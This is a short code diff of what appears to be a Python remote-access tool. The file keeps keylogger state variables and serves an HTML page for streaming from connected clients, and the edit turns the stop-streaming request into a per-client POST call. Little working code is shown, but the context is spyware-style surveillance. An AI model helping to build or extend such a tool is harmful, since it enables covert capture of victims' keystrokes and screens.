@@ -16,7 +16,6 @@ streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
 
-# HTML template for video streaming with a stop button
 html_template = """
 <!doctype html>
 <html lang="en">
@@ -31,7 +30,7 @@ html_template = """
     <button onclick="stopStreaming()">Stop Streaming</button>
     <script>
       function stopStreaming() {
-        fetch('/stop_streaming')
+        fetch('/stop_streaming_{{ client_id }}', { method: 'POST' })
           .then(response => response.text())
           .then(data => alert(data));
       }
@@ -39,6 +38,7 @@ html_template = """
   </body>
 </html>
 """
+
 
 def start_streaming(client_socket, mode, client_id):
     global streaming
